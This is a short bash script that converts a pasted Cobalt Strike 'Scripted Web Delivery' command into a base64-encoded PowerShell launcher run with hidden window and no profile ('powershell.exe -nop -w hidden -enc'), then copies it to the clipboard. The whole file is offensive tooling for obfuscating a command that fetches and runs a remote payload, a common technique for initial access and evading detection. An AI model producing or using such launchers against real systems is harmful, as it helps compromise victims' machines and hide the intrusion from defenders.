#!/bin/bash
# Script to base64 encode a CobaltStrike Webdelivery String
# 06/05/2018 Version 1.0
# Regular Colors
Black='\033[0;30m'        # Black
Red='\033[0;31m'          # Red
Green='\033[0;32m'        # Green
Yellow='\033[0;33m'       # Yellow
Blue='\033[0;34m'         # Blue
Purple='\033[0;35m'       # Purple
Cyan='\033[0;36m'         # Cyan
White='\033[0;37m'        # White
NC='\033[0m' 			  # No Color


main () {
	clear
	echo ""
	echo -e ${Green}"This script base64 encodes a CobaltStrike Scripted Webdelivery"${NC}
	echo ""
	echo -e ${Green}"Paste the entire command here: "${NC}
	echo ""
	read stringtoencode
	echo ""
	stringoutputtemp="$(echo $stringtoencode | cut -d '"' -f 2)"
	stringoutput="$(echo "$stringoutputtemp")"
	echo ""
	encodedcommand="$(echo "$stringoutput" | iconv --to-code UTF-16LE | base64 -w 0)"
	stringoutput="$(echo "$encodedcommand" | sed -e 's/^/powershell.exe -nop -w hidden -enc /')"
	echo "$stringoutput" | xclip -selection clipboard
	echo -e ${Green}"The comand with encoded string has been copied to the clipboard"${NC}
	echo ""
	echo ""
}

main